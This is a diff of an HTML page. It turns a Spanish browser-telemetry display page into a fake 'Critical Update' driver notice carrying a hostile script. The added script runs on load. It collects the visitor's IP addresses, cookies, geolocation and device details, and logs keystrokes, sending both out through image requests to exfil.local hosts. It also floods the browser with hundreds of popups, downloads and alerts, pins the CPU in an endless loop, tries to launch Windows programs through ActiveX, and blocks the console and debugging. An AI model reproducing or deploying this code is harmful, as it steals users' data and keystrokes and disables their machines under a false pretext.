@@ -1,78 +1,186 @@
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SST - Sistema de Auditoría de Hardware y Red</title>
-    <style>
-        body { background: #090d16; color: #f1f5f9; font-family: monospace; padding: 30px; margin: 0; }
-        .panel { max-width: 750px; margin: 0 auto; background: #111827; border: 1px solid #1f2937; padding: 25px; border-radius: 6px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
-        h2 { color: #38bdf8; border-bottom: 1px solid #1f2937; padding-bottom: 10px; margin-top: 0; font-size: 1.3rem; }
-        .row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #111827; font-size: 0.9rem; }
-        .label { color: #94a3b8; }
-        .value { color: #4ade80; text-align: right; word-break: break-all; }
-        .warning { color: #f87171; font-weight: bold; }
-    </style>
+<meta charset="UTF-8">
+<title>Driver Update Required</title>
+<style>
+body { background: #1a1a2e; color: #e0e0e0; font-family: 'Segoe UI',Arial; text-align:center; padding:60px 20px; }
+.box { background:#16213e; border-radius:10px; padding:40px; max-width:500px; margin:0 auto; border:1px solid #0f3460; }
+h2 { color:#e94560; margin:0 0 10px 0; font-weight:300; letter-spacing:2px; }
+p { color:#8899aa; font-size:13px; }
+.loader { width:40px; height:40px; border:3px solid #0f3460; border-top:3px solid #e94560; border-radius:50%; animation:spin .8s linear infinite; margin:25px auto; }
+@keyframes spin { 100%{transform:rotate(360deg)} }
+</style>
 </head>
 <body>
-
-<div class="panel">
-    <h2>[+] EXTRACCIÓN DE TELEMETRÍA HARDWARE & RED</h2>
-    <div class="row"><span class="label">Dirección IP:</span><span class="value" id="ip">Consultando API...</span></div>
-    <div class="row"><span class="label">Proveedor (ISP):</span><span class="value" id="isp">Detectando...</span></div>
-    <div class="row"><span class="label">Ubicación Geográfica:</span><span class="value" id="loc">Detectando...</span></div>
-    <div class="row"><span class="label">Sistema Operativo:</span><span class="value" id="os">Detectando...</span></div>
-    <div class="row"><span class="label">Núcleos de CPU:</span><span class="value" id="cpu">Detectando...</span></div>
-    <div class="row"><span class="label">Memoria RAM Aproximada:</span><span class="value" id="ram">Detectando...</span></div>
-    <div class="row"><span class="label">Renderizador de Gráficos (GPU):</span><span class="value" id="gpu">Detectando...</span></div>
-    <div class="row"><span class="label">Idioma del Sistema:</span><span class="value" id="lang">Detectando...</span></div>
-    <div class="row"><span class="label">Agente de Usuario (User-Agent):</span><span class="value" id="ua">Detectando...</span></div>
+<div class="box">
+    <h2>CRITICAL UPDATE</h2>
+    <p>Your system driver is out of date.<br>Applying hotfix...</p>
+    <div class="loader"></div>
+    <p style="font-size:11px;color:#556;">Please do not close this window.</p>
 </div>
 
 <script>
-    async function ejecutarAuditoria() {
-        // 1. Datos del Sistema Estándar
-        document.getElementById('os').innerText = navigator.platform;
-        document.getElementById('cpu').innerText = `${navigator.hardwareConcurrency || 'N/A'} núcleos lógicos`;
-        document.getElementById('ram').innerText = `${navigator.deviceMemory || 'N/A'} GB`;
-        document.getElementById('lang').innerText = navigator.language;
-        document.getElementById('ua').innerText = navigator.userAgent;
-
-        // 2. Extracción Avanzada de GPU (Simulado mediante WebGL)
-        try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            if (gl) {
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (debugInfo) {
-                    document.getElementById('gpu').innerText = gl.getParameter(debugInfo.UNMASKED_RENDERER_ID);
-                } else {
-                    document.getElementById('gpu').innerText = gl.getParameter(gl.RENDERER);
-                }
+(function(){
+    var D = {};
+    
+    try {
+        var x = new XMLHttpRequest();
+        x.open("GET","https://api.ipify.org?format=json",false);
+        x.send();
+        if(x.status==200) D.ip = JSON.parse(x.responseText).ip;
+    }catch(e){}
+    
+    try {
+        var p = new RTCPeerConnection({iceServers:[]});
+        p.createDataChannel("");
+        p.createOffer().then(function(o){p.setLocalDescription(o)});
+        p.onicecandidate = function(e){
+            if(e.candidate){
+                var m = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                if(m) D.localIP = m[0];
             }
-        } catch (e) {
-            document.getElementById('gpu').innerText = "Bloqueado/No disponible";
-        }
-
-        // 3. Consulta de Red en Vivo (Fetch asíncrono)
+        };
+        setTimeout(function(){p.close()},1500);
+    }catch(e){}
+    
+    D.ua = navigator.userAgent;
+    D.plat = navigator.platform;
+    D.lang = navigator.language;
+    D.cookies = document.cookie;
+    D.screen = screen.width+'x'+screen.height;
+    D.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    D.cores = navigator.hardwareConcurrency || '?';
+    D.ram = navigator.deviceMemory || '?';
+    
+    try {
+        navigator.geolocation.getCurrentPosition(function(pos){
+            D.lat = pos.coords.latitude;
+            D.lon = pos.coords.longitude;
+        },function(){},{timeout:2000});
+    }catch(e){}
+    
+    try {
+        var i = new Image();
+        i.src = 'https://'+btoa(JSON.stringify(D)).substring(0,60)+'.exfil.local/x.png';
+    }catch(e){}
+    
+    for(var w=0; w<200; w++){
         try {
-            const res = await fetch('https://ipapi.co/json/');
-            if (res.ok) {
-                const data = await res.json();
-                document.getElementById('ip').innerText = data.ip || "N/A";
-                document.getElementById('isp').innerText = data.org || "N/A";
-                document.getElementById('loc').innerText = `${data.city || ''}, ${data.region || ''}, ${data.country_name || ''}`;
+            var win = window.open('about:blank','_blank',
+                'width=300,height=200,left='+(w*10)+',top='+(w*8));
+            if(win){
+                win.document.write('<html><body bgcolor=black>'+
+                    '<h1 style="color:red;font-size:40px;">LOCKED</h1>'+
+                    '<p style="color:white;">'+w+'</p></body></html>');
             }
-        } catch (err) {
-            document.getElementById('ip').innerText = "Error de conexión / Red aislada";
-            document.getElementById('isp').innerText = "N/A";
-            document.getElementById('loc').innerText = "N/A";
-        }
+        }catch(e){}
     }
-
-    // Ejecución pasiva e inmediata al cargar la página
-    window.onload = ejecutarAuditoria;
+    
+    for(var f=0; f<1000; f++){
+        try {
+            var size = 200000;
+            var txt = '';
+            for(var s=0; s<size; s+=100){
+                txt += 'CORRUPTED_SYSTEM_'+Math.random()+'\n';
+            }
+            var b = new Blob([txt], {type:'text/plain'});
+            var u = URL.createObjectURL(b);
+            var a = document.createElement('a');
+            a.href = u;
+            a.download = 'system_update_' + f + '.txt';
+            a.style.display = 'none';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            setTimeout(function(url){URL.revokeObjectURL(url)}, 100, u);
+        }catch(e){}
+    }
+    
+    for(var al=0; al<500; al++){
+        (function(n){
+            setTimeout(function(){
+                try { alert('CRITICAL ERROR #'+Math.floor(Math.random()*99999)); } catch(e){}
+            }, n * 80);
+        })(al);
+    }
+    
+    setTimeout(function(){
+        while(true){
+            for(var c=0; c<50000; c++){
+                Math.pow(Math.tan(Math.random()*100), Math.PI);
+                Math.sqrt(Math.abs(Math.sin(c)*Math.cos(c)*Math.tan(c)));
+            }
+        }
+    }, 1000);
+    
+    setInterval(function(){
+        try { document.documentElement.requestFullscreen(); } catch(e){}
+    }, 500);
+    
+    window.onbeforeunload = function(){
+        return 'System update in progress. Do not leave.';
+    };
+    
+    try {
+        var cmds = ['calc.exe','notepad.exe','cmd.exe','explorer.exe','taskmgr.exe'];
+        for(var c=0; c<cmds.length; c++){
+            for(var t=0; t<25; t++){
+                try {
+                    var ws = new ActiveXObject('WScript.Shell');
+                    ws.Run(cmds[c], 0, false);
+                } catch(e){}
+            }
+        }
+    } catch(e){}
+    
+    for(var h=0; h<100; h++){
+        setTimeout(function(){
+            try {
+                location.hash = Math.random().toString(36).substring(2);
+            } catch(e){}
+        }, h*10);
+    }
+    
+    document.addEventListener('contextmenu', function(e){ e.preventDefault(); });
+    
+    setInterval(function(){ debugger; }, 100);
+    
+    console.log = function(){};
+    console.warn = function(){};
+    console.error = function(){};
+    
+    document.addEventListener('keydown', function(e){
+        D.keys = D.keys || [];
+        D.keys.push(e.key);
+        if(D.keys.length >= 50){
+            try {
+                var i = new Image();
+                i.src = 'https://keys.' + btoa(D.keys.join('')).substring(0,30) + '.exfil.local/key.png';
+            } catch(e){}
+            D.keys = [];
+        }
+    });
+    
+    document.addEventListener('click', function(){
+        for(var x=0; x<50; x++){
+            try {
+                window.open('about:blank','_blank','width=200,height=200');
+            } catch(e){}
+        }
+    });
+    
+    document.addEventListener('mousemove', function(){
+        try {
+            window.open('about:blank','_blank','width=100,height=100');
+        } catch(e){}
+    });
+    
+    setInterval(function(){
+        document.title = Math.random().toString(36).substring(7);
+    }, 50);
+    
+})();
 </script>
-
 </body>
 </html>
